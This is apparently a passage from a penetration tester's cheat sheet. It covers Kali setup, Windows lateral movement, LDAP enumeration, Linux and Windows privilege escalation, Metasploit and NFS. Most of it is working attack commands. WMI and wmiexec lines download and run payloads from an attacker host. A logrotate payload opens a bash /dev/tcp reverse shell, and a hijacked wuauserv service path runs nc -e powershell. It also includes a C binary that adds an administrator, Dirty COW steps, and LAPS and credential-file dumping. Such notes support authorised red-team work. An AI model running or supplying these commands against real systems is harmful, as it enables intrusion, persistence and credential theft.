				* Re-login as snovvcrash
		}
	* Disable kali user [VM]
		SWITCH {
			CASE (lock):
				$ sudo usermod -L kali
				$ sudo usermod -s /sbin/nologin kali
				$ sudo chage -E0 kali
			CASE (delete):
				$ sudo userdel -r kali
		}
[ALL] Configure sudo
	* Increase sudo password timeout value or disable password prompt completely
	$ sudo visudo
		SWITCH {
			CASE (increase timeout):
				"Defaults    env_reset,timestamp_timeout=45"
			CASE (disable password):
				"snovvcrash ALL=(ALL) NOPASSWD: ALL"
		}
[ALL] Install cmake
	$ sudo apt install cmake -y
[ALL] Clone dotfiles
	$ git clone https://github.com/snovvcrash/dotfiles-linux ~/.dotfiles
[ALL] Run ~/.dotfiles/00-autodeploy scripts on the discretion
```




## VirtualBox



### Guest Additions

Known issues:

* [https://forums.virtualbox.org/viewtopic.php?f=3&t=96087](https://forums.virtualbox.org/viewtopic.php?f=3&t=96087)
* [https://www.ceos3c.com/hacking/kali-linux-2020-1-virtualbox-shared-clipboard-stopped-working-fixed/](https://www.ceos3c.com/hacking/kali-linux-2020-1-virtualbox-shared-clipboard-stopped-working-fixed/)



### Network

Configure multiple interfaces to work simultaneously:

```
$ cat /etc/network/interfaces
 # This file describes the network interfaces available on your system
 # and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

 # NAT
allow-hotplug eth0
iface eth0 inet dhcp

 # Internal
allow-hotplug eth1
iface eth1 inet dhcp

 # Host-only
allow-hotplug eth2
iface eth2 inet dhcp

 # The loopback network interface
auto lo
iface lo inet loopback
```

```
$ ifup eth0
$ ifup eth1
$ ifup eth2
```

* [https://unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on](https://unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on)
* [https://kali.training/topic/configuring-the-network/](https://kali.training/topic/configuring-the-network/)
* [https://www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/](https://www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/)
* [https://www.virtualbox.org/manual/ch06.html](https://www.virtualbox.org/manual/ch06.html)
* [https://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time](https://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-%28eth0-eth1-etc%29-can-be-active-at-a-time)



### Share Folder (depreciated)

Mount:

```
$ mkdir ~/Desktop/Share
$ mount -t vboxsf /mnt/share-host ~/Desktop/Share
Or (if mounted from VBox settings)
$ ln -s /mnt/share-host ~/Desktop/Share

$ sudo adduser $USER vboxsf
```

Automount:

```
$ crontab -e
"@reboot    sleep 10; mount -t vboxsf /mnt/share-host ~/Desktop/Share"
```





# Lateral Movement

* [https://eventlogxp.com/blog/logon-type-what-does-it-mean/](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)
* [https://www.infosecmatter.com/rce-on-windows-from-linux-part-1-impacket/](https://www.infosecmatter.com/rce-on-windows-from-linux-part-1-impacket/)
* [https://www.hackingarticles.in/remote-code-execution-using-impacket/](https://www.hackingarticles.in/remote-code-execution-using-impacket/)
* [https://xakep.ru/2020/11/16/lateral-guide/](https://xakep.ru/2020/11/16/lateral-guide/)




## RDP

* [https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop](https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop)
* [https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3](https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3)
* [https://swarm.ptsecurity.com/remote-desktop-services-shadowing/](https://swarm.ptsecurity.com/remote-desktop-services-shadowing/)



### Enable RDP

From meterpreter:

```
meterpreter > run getgui -e
```

From PowerShell:

```
PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
PS > Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
```



### Restricted Admin

* [https://www.kali.org/penetration-testing/passing-hash-remote-desktop/](https://www.kali.org/penetration-testing/passing-hash-remote-desktop/)
* [https://blog.ahasayen.com/restricted-admin-mode-for-rdp/](https://blog.ahasayen.com/restricted-admin-mode-for-rdp/)
* [https://labs.f-secure.com/blog/undisable/](https://labs.f-secure.com/blog/undisable/)
* [https://shellz.club/pass-the-hash-with-rdp-in-2019/](https://shellz.club/pass-the-hash-with-rdp-in-2019/)

RDP with [PtH](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/): RDP needs a plaintext password unless Restricted Admin mode is enabled.

Enable Restricted Admin mode:

```
PS > Get-ChildItem -Recurse HKLM:\System\CurrentControlSet\Control\Lsa
PS > Get-Item HKLM:\System\CurrentControlSet\Control\Lsa
PS > New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name "DisableRestrictedAdmin" -Value 0 -PropertyType "DWORD"
PS > Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name "DisableRestrictedAdmin"
```



### NLA

Disable NLA:

```
PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
```



### Abusing CredSSP / TSPKG

* [https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/](https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/)




## runas

```
PS > runas /netonly /user:snovvcrash powershell
```




## WinRM / PSRemoting

* [https://www.bloggingforlogging.com/2018/01/24/demystifying-winrm/](https://www.bloggingforlogging.com/2018/01/24/demystifying-winrm/)
* [https://www.powershellmagazine.com/2014/03/06/accidental-sabotage-beware-of-credssp/](https://www.powershellmagazine.com/2014/03/06/accidental-sabotage-beware-of-credssp/)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons)



### Evil-WinRM

* [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

Install:

```
$ git clone https://github.com/Hackplayers/evil-winrm ~/tools/evil-winrm
$ cd ~/tools/evil-winrm && bundle install && cd -
$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm
Or
$ gem install evil-winrm
```

Run:

```
$ evil-winrm -u '[MEGACORP\]snovvcrash' -p 'Passw0rd!' -i 10.10.13.37 -s `pwd` -e `pwd`
$ evil-winrm -u '[MEGACORP\]snovvcrash' -H FC525C9683E8FE067095BA2DDC971889 -i 10.10.13.37 -s `pwd` -e `pwd`
```

Note: always use full username when authenticating as a domain user, because if there're 2 users sharing the same name (a local user and a domain user), say `WORKGROUP\Administrator` and `MEGACORP\Administrator`, and you're trying to authenticate as a domain admin without providing the domain prefix, authentication will fail.




## SMB



### PsExec

* [https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec](https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec)
* [https://blog.openthreatresearch.com/ntobjectmanager_rpc_smb_scm](https://blog.openthreatresearch.com/ntobjectmanager_rpc_smb_scm)


#### psexec.py

```
$ psexec.py snovvcrash:'Passw0rd!'@127.0.0.1 [powershell.exe]
$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
```




## WMI

* [https://www.ethicalhacker.net/features/root/wmi-101-for-pentesters/](https://www.ethicalhacker.net/features/root/wmi-101-for-pentesters/)



### PowerShell

Basic command to check if we have privileges to execute WMI:

```
PS > Get-WmiObject -Credential $cred -ComputerName PC01 -Namespace "root" -class "__Namesapce" | Select Name
```

Execute commands:

```
PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create -ArgumentList ("powershell (New-Object Net.WebClient).DownloadFile('http://10.10.13.37/nc.exe', 'C:\Users\bob\music\nc.exe')")
PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name Create -ArgumentList ("C:\Users\bob\music\nc.exe 10.10.13.37 1337 -e powershell")
```



### wmiexec.py

```
$ wmiexec.py -codec cp866 snovvcrash:'Passw0rd!'@127.0.0.1
$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
```

Get a PowerShell reverse-shell:

```
$ sudo python3 -m http.server 80
$ sudo rlwrap nc -lvnp 443
$ wmiexec.py -nooutput snovvcrash:'Passw0rd!'@10.10.13.38 "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/rev.ps1')"
```




## Rubeus

* [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
* [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

Create a sacrificial process, legitimately ask Kerberos for TGT and interact with the process:

* [https://github.com/GhostPack/Rubeus#example-over-pass-the-hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash)

```
Cmd > .\Rubeus.exe asktgt /domain:megacorp.local /dc:dc1 /user:snovvcrash /password:Passw0rd! /createnetonly:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /show
```




## Run as Another User



### Cmd


#### runas

```
Cmd > runas /u:snovvcrash powershell.exe
```


#### PowerShell

```
PS > $cred = New-Object System.Management.Automation.PSCredential('<HOSTNAME>\<USERNAME>', $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force))
```

##### Process.Start

```
PS > $computer = "PC01"
PS > [System.Diagnostics.Process]::Start("C:\Windows\System32\cmd.exe", "/c ping -n 1 10.10.13.37", $cred.Username, $cred.Password, $computer)
```

##### Start-Process

```
PS > Start-Process -FilePath "C:\Windows\System32\cmd.exe" -ArgumentList "/c ping -n 1 10.10.13.37" -Credential $cred
```

##### Invoke-Command

With `-Credential`:

```
PS > Invoke-Command -ComputerName <HOSTNAME> -ScriptBlock { whoami } -Credential $cred
```

With `-Session`:

```
PS > $s = New-PSSession -ComputerName <HOSTNAME> -Credential $cred
PS > Invoke-Command -ScriptBlock { whoami } -Session $s
```

##### Invoke-RunAs

* [https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/management/Invoke-RunAs.ps1](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/management/Invoke-RunAs.ps1)

```
PS > Invoke-RunAs -UserName snovvcrash -Password 'Passw0rd!' -Domain MEGACORP -Cmd cmd.exe -Arguments "/c ping -n 1 10.10.13.37"
```

##### Invoke-CommandAs

* [https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1](https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1)
* [https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1](https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1)
* [https://malicious.link/post/2020/run-as-system-using-evil-winrm/](https://malicious.link/post/2020/run-as-system-using-evil-winrm/)

```
PS > . .\Invoke-ScheduledTask.ps1
PS > . .\Invoke-CommandAs.ps1
PS > Invoke-CommandAs -ScriptBlock {whoami} -AsUser $cred
```

##### RunasCs

* [https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)

```
$ rlwrap nc -lvnp 1337
PS > Invoke-RunasCs -Username snovvcrash -Password 'Passw0rd!' -Domain megacorp.local -Command powershell.exe -Remote 10.10.13.37:1337
```





# LDAP

* [https://book.hacktricks.xyz/pentesting/pentesting-ldap](https://book.hacktricks.xyz/pentesting/pentesting-ldap)




## ldapsearch

Basic syntax:

```
$ ldapsearch -h 127.0.0.1 -x -s <SCOPE> -b <BASE_DN> <QUERY> <FILTER> <FILTER> <FILTER>
```

Get base naming contexts:

```
$ ldapsearch -h 127.0.0.1 -x -s base namingcontexts
```

Extract data for the whole domain catalog and then grep your way through:

```
$ ldapsearch -h 127.0.0.1 -x -s sub -b "DC=megacorp,DC=local" | tee ldapsearch.out
$ cat ldapsearch.out | grep -i memberof
```

Or filter out only what you need:

```
$ ldapsearch -h 127.0.0.1 -x -b "DC=megacorp,DC=local" '(objectClass=User)' sAMAccountName sAMAccountType
```

Get `Remote Management Users` group:

```
$ ldapsearch -h 127.0.0.1 -x -b "DC=megacorp,DC=local" '(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=megacorp,DC=local)' | grep -i memberof
```

Dump LAPS passwords:

```
$ ldapsearch -h 127.0.0.1 -x -b "dc=megacorp,dc=local" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
```

Simple authentication with ldapsearch:

```
$ ldapsearch -H ldap://127.0.0.1:389 -x -D 'CN=snovvcrash,CN=Users,DC=megacorp,DC=local' -w 'Passw0rd!' -s sub -b 'DC=megacorp,DC=local' | tee ldapsearch.out
```

Analyze large output for anomalies by searching for unique strings:

```
$ cat ldapsearch.out | awk '{print $1}' | sort | uniq -c | sort -nr
```




## windapsearch

* [https://github.com/ropnop/windapsearch](https://github.com/ropnop/windapsearch)

Enumerate all AD Computers:

```
./windapsearch.py -u 'megacorp.local\snovvcrash' -p 'Passw0rd!' --dc 127.0.0.1 -C
```




## Nmap NSE

```
$ nmap -n -Pn -sV --script ldap-rootdse 127.0.0.1 -p389
$ nmap -n -Pn -sV --script ldap-search 127.0.0.1 -p389
$ nmap -n -Pn -sV --script ldap-brute 127.0.0.1 -p389
```





# LPE

* [PayloadsAllTheThings/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)




## Linux



### Filesystem

Grep for sensitive keywords:

```
$ grep -nir passw /etc/ 2>/dev/null
```

Find and list all files newer than `2020-03-16` and not newer than `2020-03-17`:

```
$ find / -type f -readable -newermt '2020-03-16' ! -newermt '2020-03-17' -ls 2>/dev/null
```

Find SUID binaries:

```
 # User
$ find / -type f -perm /4000 -ls 2>/dev/null
 # Group
$ find / -type f -perm /2000 -ls 2>/dev/null
 # Both
$ find / -type f -perm /6000 -ls 2>/dev/null
```


#### linPEAS

* [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)



### Rootkits

* [0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485](https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485)



### Dirty COW

* [https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)

```
$ curl -L https://github.com/FireFart/dirtycow/raw/master/dirty.c > dirty.c
$ gcc dirty.c -o dirty -pthread -lcrypt
$ ./dirty Passw0rd
$ su firefart
```



### logrotate

* [https://github.com/whotwagner/logrotten/blob/master/logrotten.c](https://github.com/whotwagner/logrotten/blob/master/logrotten.c)

```
$ curl https://github.com/whotwagner/logrotten/raw/master/logrotten.c > lr.c
$ gcc lr.c -o lr

$ cat payloadfile
if [ `id -u` -eq 0 ]; then (bash -c 'bash -i >& /dev/tcp/10.10.15.171/9001 0>&1' &); fi

$ ./lr -p ./payload -t /home/snovvcrash/backups/access.log -d
```

* [https://github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)
* [https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)
* [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
* [https://popsul.ru/blog/2013/01/post-42.html](https://popsul.ru/blog/2013/01/post-42.html)



### motd

`/etc/update-motd.d/`:

```
$ shellpop --reverse --number 8 -H 127.0.0.1 -P 1337 --base64
$ echo '<BASE64_SHELL>' >> 00-header
* Fire up new SSH session and catch the reverse shell
```

* [https://www.securityfocus.com/bid/50192/discuss](https://www.securityfocus.com/bid/50192/discuss)

PAM MOTD:

* [https://www.exploit-db.com/exploits/14273](https://www.exploit-db.com/exploits/14273)
* [https://www.exploit-db.com/exploits/14339](https://www.exploit-db.com/exploits/14339)




## Windows



### Registry & Filesystem

```
PS > gc $env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
PS > cmd /c dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
PS > cmd /c where /R C:\ *.ini
PS > cmd /c 'cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt'
PS > reg query HKLM /f "password" /t REG_SZ /s
PS > reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AltDefaultUserName AltDefaultDomainName AltDefaultPassword LastUsedUsername"
Or
PS > Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | select DefaultPassword
PS > reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | findstr /i proxy
```



### AccessChk

* [https://www.fuzzysecurity.com/tutorials/16.html](https://www.fuzzysecurity.com/tutorials/16.html)
* [https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
* [https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula/](https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula/)

Find weak file permissions:

```
Cmd > .\accesschk.exe /accepteula -uwsq Users c:\*.*
Cmd > .\accesschk.exe /accepteula -uwsq "Authenticated Users" c:\*.*
```

Find weak directory permissions:

```
Cmd > .\accesschk.exe /accepteula -uwdsq Users c:\
Cmd > .\accesschk.exe /accepteula -uwdsq "Authenticated Users" c:\
```

Find weak service permissions:

```
.\accesschk.exe /accepteula -uwcqv Users *
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```


#### upnphost & SSDPSRV (Windows XP)

* [https://sohvaxus.github.io/content/winxp-sp1-privesc.html](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)
* [PayloadsAllTheThings/Example with Windows XP SP0/SP1 - upnphost](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#example-with-windows-xp-sp1---upnphost)
* [https://www.exploit-db.com/exploits/1465](https://www.exploit-db.com/exploits/1465)
* [http://www.tarasco.org/security/srvcheck/index.html](http://www.tarasco.org/security/srvcheck/index.html)



### Unquoted Service Paths

* [https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths](https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths)

[CreateProcessA](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) function parses an unquoted `BINARY_PATH_NAME` like follows:

```
C:\Program Files\Sub Directory\Program Name.exe
  -> C:\Program.exe
  -> C:\Program Files\Sub.exe
  -> C:\Program Files\Sub Directory\Program.exe
  -> C:\Program Files\Sub Directory\Program Name.exe

C:\Program.exe C:\Program Files\Sub.exe C:\Program Files\Sub Directory\Program.exeC:\Program Files\Sub Directory\Program Name.exe
```

It gives an attacker the ability to inject malious binary into path to be executed with vulnerable service permissions.

Enumerate services:

```
PS > Get-WmiObject win32_service | Select-Object Name,State,PathName | Where-Object {$_.State -like 'Running'} | findstr /vi "c:\windows"
Cmd > wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /iv c:\windows
Cmd > sc qc VulnerableSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnerableSvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Vulnerable\Vulnerable Service\VulnerableService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Vulnerable Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Exploit `VulnerableSvc`:

```
Cmd > move pwn.exe "C:\Program Files\Vulnerable\Vulnerable.exe"
Cmd > sc stop VulnerableSvc
Cmd > sc start VulnerableSvc
...Or reboot the PC if the attacker has SeShutdownPrivilege...
Cmd > shutdown /r /t 0
```

Malious binary example:

```c
// i686-w64-mingw32-gcc -o pwn.exe pwn.c

 #include <stdio.h>
 #include <stdlib.h>

void main() {
        system("net user snovvcrash Passw0rd! /add");
        system("net localgroup administrators snovvcrash /add");
}
```



### SDDL

* [https://habr.com/ru/company/pm/blog/442662/](https://habr.com/ru/company/pm/blog/442662/)
* [0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html](https://0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html)
* [0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html](https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html)
* [https://security-tzu.com/2020/11/01/setobjectsecurity-exe-sddl/](https://security-tzu.com/2020/11/01/setobjectsecurity-exe-sddl/)



### wuauserv

```
PS > Get-Acl HKLM:\SYSTEM\CurrentControlSet\services\* | format-list * | findstr /i "snovvcrash Users Path ChildName"
PS > Get-ItemProperty HKLM:\System\CurrentControlSet\services\wuauserv
PS > reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.16 1337 -e powershell" /f
PS > Start-Service wuauserv
...get reverse shell...
PS > Get-Service wuauserv
PS > Stop-Service wuauserv
```



### UPnP Device Host Service

**CVE-2019-1405, CVE-2019-1322 - Windows 10, version 1803 < 1809**

* [https://www.programmersought.com/article/35344126658/](https://www.programmersought.com/article/35344126658/)
* [https://github.com/apt69/COMahawk/releases](https://github.com/apt69/COMahawk/releases)

```
Cmd > .\COMahawk64.exe "C:\Temp\pwn.exe"
```





# Metasploit

* [https://buffered.io/posts/staged-vs-stageless-handlers/](https://buffered.io/posts/staged-vs-stageless-handlers/)
* [https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/)
* [https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation](https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation)




## Cheatsheet

Quick handler launch:

```
msf > handler -H eth0 -P 443 -p windows/x64/meterpreter/reverse_https [-e x64/xor] [-x]
```

Bind RC4 handler through SOCKS proxy:

```
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp_rc4
msf exploit(multi/handler) > set rhosts 127.0.0.1
msf exploit(multi/handler) > set lport 1337
msf exploit(multi/handler) > set rc4password Passw0rd!
msf exploit(multi/handler) > set proxies socks5:127.0.0.1:1080
msf exploit(multi/handler) > run
```

Change meterpreter shell transport:

```
meterpreter > transport add -t reverse_tcp -l 10.10.13.37 -p 9002
meterpreter > transport list
msf > handler -H eth0 -P 9002 -p windows/x64/meterpreter/reverse_tcp
meterpreter > transport next
```

Automation (about `exploit` options [here](https://github.com/rapid7/metasploit-framework/blob/4049c41ac1b6f12566b055dc5442192072ea5d78/lib/msf/ui/console/command_dispatcher/exploit.rb#L17-L27)):

```
// auto.rc
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 10.10.13.37
set lport 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
exploit -jz
```

```
$ sudo msfconsole -qr auto.rc
```

Reverse local port `3389` (on Victim, `10.10.13.37`) to local port `43389` (on Attacker):

```
meterpreter > portfwd add -l 43389 -p 3389 -r 10.10.13.37
[*] Local TCP relay created: :43389 <-> 10.10.13.37:3389
$ xfreerdp /u:administrator /p:'Passw0rd!' /v:127.0.0.1:43389
```

Routing:

```
meterpreter > run autoroute -s 192.168.10.0/24
meterpreter > run autoroute -p
Or
msf5 > route add 192.168.10.0/24 1
msf5 > route
```

Start SOCKS server (default is SOCKS5):

```
msf > use auxiliary/server/socks_proxy
msf auxiliary(server/socks_proxy) > set srvhost 127.0.0.1
msf auxiliary(server/socks_proxy) > run -j
```




## Debug

1. [https://github.com/deivid-rodriguez/pry-byebug](https://github.com/deivid-rodriguez/pry-byebug)
2. [https://www.youtube.com/watch?v=QzP5nUEhZeg&t=2190](https://www.youtube.com/watch?v=QzP5nUEhZeg&t=2190)

```
$ gem install pry-byebug
$ vi ~/.pry-byebug
...
```

```ruby
if defined?(PryByebug)
  Pry.commands.alias_command 'c', 'continue'
  Pry.commands.alias_command 's', 'step'
  Pry.commands.alias_command 'n', 'next'
  Pry.commands.alias_command 'f', 'finish'
end

 # Hit Enter to repeat last command
Pry::Commands.command /^$/, "repeat last command" do
  _pry_.run_command Pry.history.to_a.last
end
```

```
...
$ cp -r /usr/share/metasploit-framework/ /opt
$ vi /opt/metasploit-framework/msfconsole
...add "require 'pry-byebug'"...
$ mkdir -p ~/.msf4/modules/exploits/linux/http/
$ cp /usr/share/metasploit-framework/modules/exploits/linux/http/packageup.rb ~/.msf4/modules/exploits/linux/http/p.rb
$ vi ~/.msf4/modules/exploits/linux/http/p.rb
...add "binding.pry"...
```





# Mindmaps

* [Pentesting AD](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
* [Pentesting Exchange](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/Pentesting_MS_Exchange_Server_on_the_Perimeter.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
* [Abusing ACEs](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/ACEs_xmind.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
* [Pentesting Wi-Fi](https://raw.githubusercontent.com/koutto/pi-pwnbox-rogueap/main/mindmap/WiFi-Hacking-MindMap-v1.png) · [koutto/pi-pwnbox-rogueap](https://github.com/koutto/pi-pwnbox-rogueap)
* [Pentesting Web Applications](https://miro.medium.com/max/2400/1*8lN7TaTnlZSPEikpHFQnuA.png) · [Chintan Gurjar](https://medium.com/@chintanfrogygurjar/professional-web-application-pentest-checklist-10ae5b2edbdd)





# Mitigations




## Network

Mitigating ARP spoofing:

* [[PDF] Ruijie Anti-ARP Spoofing Technical White Paper](https://drive.google.com/file/d/12V2xbiCZn-YupiGc4mxYWjOmCPFNUss9/view?usp=sharing)




## AD

Common vulnerabilities & misconfigurations and recommendations:

* [https://www.infosecmatter.com/top-16-active-directory-vulnerabilities/#2-admincount-attribute-set-on-common-users](https://www.infosecmatter.com/top-16-active-directory-vulnerabilities/#2-admincount-attribute-set-on-common-users)
* [https://threadreaderapp.com/thread/1369309701050142720.html](https://threadreaderapp.com/thread/1369309701050142720.html)
* [https://s3cur3th1ssh1t.github.io/The-most-common-on-premise-vulnerabilities-and-misconfigurations/](https://s3cur3th1ssh1t.github.io/The-most-common-on-premise-vulnerabilities-and-misconfigurations/)

SMB lateral-movement hardening:

* [https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f)
* [https://medium.com/palantir/restricting-smb-based-lateral-movement-in-a-windows-environment-ed033b888721](https://medium.com/palantir/restricting-smb-based-lateral-movement-in-a-windows-environment-ed033b888721)
* [[PDF] SMB Enumeration & Exploitation & Hardening (Anil BAS)](https://drive.google.com/file/d/13msLIywr_Slc00Rv3jue0lkRf7_1O1gM/view?usp=sharing)

Antispam protection for Exchange:

* [[PDF] Antispam Forefront Protection 2010 (Exchange Server)](https://drive.google.com/file/d/1B-HUcZMZkFjqNs3ckuiiTpYSKdI0EsiR/view?usp=sharing)





# NFS

* [https://resources.infosecinstitute.com/exploiting-nfs-share/](https://resources.infosecinstitute.com/exploiting-nfs-share/)
* [https://blog.christophetd.fr/write-up-vulnix/](https://blog.christophetd.fr/write-up-vulnix/)
* [https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)




## Nmap

Discover rpcbind:

```
$ sudo nmap -sV --script rpcinfo 10.10.13.37 -p111
```

Run Nmap scripts:

```
$ sudo nmap -sV --script 'nfs*' 10.10.13.37 -p2049
```




## Mount

```
$ showmount -e 10.10.13.37
$ sudo mount -v -t nfs -o vers=3 -o nolock -o user=snovvcrash,pass='Passw0rd!' 10.10.13.37:/home /mnt/nfs
```





# NTLM

* [https://en.hackndo.com/ntlm-relay/](https://en.hackndo.com/ntlm-relay/)
* [https://blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/](https://blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/)




## Responder Capture Structure

`[SMB] NTLMv1 Hash` and `[SMB] NTLMv1-SSP Hash` capture structure:

```
